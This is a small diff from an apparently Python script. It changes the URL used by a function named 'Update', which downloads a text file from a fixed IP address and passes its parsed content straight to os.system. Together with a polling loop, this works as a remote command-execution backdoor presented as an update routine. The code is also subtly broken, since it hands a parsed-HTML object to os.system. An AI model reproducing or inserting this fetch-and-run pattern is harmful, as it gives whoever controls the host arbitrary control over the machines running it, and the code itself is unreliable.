@@ -11,7 +11,7 @@ while True:
   time.sleep(1)
   
 def Update():
-UpURL = "http://10.42.252.186/newfile.txt"
+UpURL = "http://10.42.252.186/Update.txt"
   Up = requests.get(UpURL)
   Ups = BeautifulSoup(Up.content, "html.parser")
   os.system(Ups)
